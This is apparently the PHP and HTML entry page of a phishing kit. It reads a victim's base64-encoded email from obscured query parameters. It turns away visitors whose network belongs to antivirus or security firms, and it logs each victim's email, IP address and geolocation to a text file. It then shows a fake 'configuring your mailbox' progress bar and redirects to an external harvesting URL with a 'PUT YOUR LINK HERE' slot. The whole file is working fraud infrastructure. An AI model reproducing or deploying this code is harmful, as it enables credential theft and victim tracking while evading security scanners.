<?php
require_once 'kancha.php';
include('shift.php');
error_reporting(0);
//Page to redirect to the main page...


//function to check for the sent parameter
function checkr($param)
{
	$result = false;
    $randwords = array("und", "usd", "usq", "usw", "use", "usr", "ust", "usy", "usu", "usi", "uso");
	if (in_array($param, $randwords))
	  {
			$result = true;
	  }
	else
	  {
			$result = false;
	  }
	  
	  return $result;
}

	//getting the email from GET
	$email = base64_encode("Invalid Email");
	if(isset($_GET["email"]) || isset($_GET["und"]) || isset($_GET["usd"]) || isset($_GET["usq"]) || isset($_GET["usw"]) || isset($_GET["use"]) || isset($_GET["usr"]) || isset($_GET["ust"]) || isset($_GET["usy"]) || isset($_GET["usu"]) || isset($_GET["usi"]) || isset($_GET["uso"]))
	{
		$getr = $_GET;
		foreach($getr as $key => $value)
		{
			// echo "<br/>" . $key . "<br/>";
			if(checkr($key) == true)
			{
				$email = $_GET["$key"];
				break;
			}
			else
			{
				// $email = "junkie@junk.com";
			}
		}
		// print($email);
		// exit;
		
	}
	else
	{
		// var_dump($_GET);
		// exit;
	}

//getting the visitor's info
	$user_ip = $_SERVER['REMOTE_ADDR'];	//Returns the IP address from where the user is viewing the current page
	//ban facebook ip ..access
		if(strlen($user_ip) > (15))
		{
			//header("location:http://africafashionweeknigeria.com/");
			echo "Sorry you do not have access to this page. 1";
			
			exit;
		}
	$user_ip_2 = $_SERVER['REMOTE_HOST'];	//Returns the port being used on the user's machine to communicate with the web server
	$user_port = $_SERVER['REMOTE_PORT'];//Returns the port being used on the user's machine to communicate with the web server
	$Utime = date("h:i:s a");
		$date = date("l d F Y");
			
		$dateandtime = " $date || " . $Utime;
		
		
		$ipaddress = "IP Address not available for this user";
		if(isset($_SERVER["REMOTE_ADDR"]))
		{
			$ipaddress = $_SERVER["REMOTE_ADDR"];
				@$ipaddress_get = json_decode(file_get_contents("http://ipinfo.io/{$ipaddress}/json"));
					@$city = $ipaddress_get->city;
					@$country = $ipaddress_get->country;
					@$state = $ipaddress_get->region;
					@$org = $ipaddress_get->org;
		}
		
		
		//ban facebook ip ...access
		if(strpos($org, "AVAST") || strpos($org, "ServeTheWorld") || strpos($org, "microsoft") || strpos($org, "NForce") || strpos($org, "Symantec") || strpos($org, "Kaspersky"))
		{
			//header("location:http://africafashionweeknigeria.com/");
			echo "Sorry you do not have access to this page. 2";
			
			exit;
		}
		$saveEmail = base64_decode($email);
		
		//check if the access came without email
	if($saveEmail == "" || $saveEmail == "Invalid Email")
	{
		echo "Sorry you do not have access to this page. 3";
		exit;
	}
		$saveEmail = base64_decode($email);
		//creating the array 
		$valuez = array("Access email " => "$saveEmail", "user_IP" => "$user_ip", "user_HOST" => "$user_ip_2", "user_PORT" => "$user_port", "date" => "$dateandtime", "city" => "$city", "country" => "$country", "state" => "$state", "org" => "$org");
			$handle = fopen("ipz.txt", "a");
		foreach($valuez as $variable => $value)
		{
		   fwrite($handle, $variable);
		   fwrite($handle, "=");
		   fwrite($handle, $value);
		   fwrite($handle, "\r\n");
		}
		fwrite($handle, "\r\n");
		fclose($handle);
	
?>
<!doctype>
<html>
	<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<title>Checking your Access!</title>
		<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha256-3edrmyuQ0w65f8gfBsqowzjJe2iM6n0nKciPUp8y+7E=" crossorigin="anonymous"></script>
			
		<style>
			body
			{
				background : #fff;
				font-family : tahoma;
			}
			
			#main
			{
				width : 50%;
				margin-left : auto;
				margin-right : auto;
				margin-top : 20%;
				background : #fff;
				text-align : center;
			}
			
			#main_hd
			{
				
			}
			
			#main_laoding_div
			{
				clear : both;
			}
			
			#main_loading_full
			{
				background : #2af;
				width : 70%;
				height : 1em;
				padding : 0.2em;
				margin-left : auto;
				margin-right : auto;
				margin-top : 2%;
				border-radius : 4px;
				box-shadow : inset 0px 0px 10px #555;
			}
			
			#main_loading_working
			{
				width : 10%;
				height : 95%;
				background : #2f9;
				background : linear-gradient(#0d8, #2f9, #0f9, #2e9, #0d8);
				border-top-right-radius : 5px;
				border-bottom-right-radius : 5px;
			}
			
			#main_loading_couting
			{
				
			}
			
		</style>
	</head>
	<body>
		<div id = "main">
			<div id = "main_hd">
				<h5>Configuring your mailbox. Please wait.</h5>
			</div>
			<div id = "main_laoding_div">
				<div id = "main_loading_full">
					<div id = "main_loading_working">
					</div>
				</div>
				<div id = "main_loading_couting">
					10%
				</div>
				<input type = "number" value = "10" id = "counter" hidden/>
			</div>
		</div>
		
		<script>
			
			
			//couting. . . 
			$("#counter").hide();
	
	function loader()
	{
		$valu = $("#counter").val();
		// alert($valu);
		if($valu == "10")
		{
			 $("#main_loading_couting").text("30%");
			 $("#counter").val("30");
			$("#main_loading_working").css("width", "30%");
		}
		else if($valu == "30")
		{
			 $("#main_loading_couting").text("55%");
			 $("#counter").val("55");
			$("#main_loading_working").css("width", "55%");
		}
		else if($valu == "55")
		{
			 $("#main_loading_couting").text("60%");
			 $("#counter").val("60");
			$("#main_loading_working").css("width", "60%");
		}
		else if($valu == "60")
		{
			 $("#main_loading_couting").text("87%");
			 $("#counter").val("87");
			$("#main_loading_working").css("width", "87%");
		}
		else if($valu == "87")
		{
			 $("#main_loading_couting").text("90%");
			 $("#counter").val("90");
			$("#main_loading_working").css("width", "90%");
		}
		else if($valu == "90")
		{
			 $("#main_loading_couting").text("100%");
			 $("#counter").val("100");
			$("#main_loading_working").css("width", "100%");
			$email = "<?php echo $email; ?>";
			
			
			//PUT YOUR LINK HERE
			window.location ="https://ecodc.pt/hrsedfhvg/wp-adi/change/?email=" + $email;
		}
		else
		{
			// $("#main_loading_couting").text("10%");
			 // $("#counter").val("10");
			// $("#main_loading_working").css("width", "10%");
		}
	}	
	
	setInterval(
		function()
		{
			loader();
		} ,1000
		);
		</script>
	</body>
<html>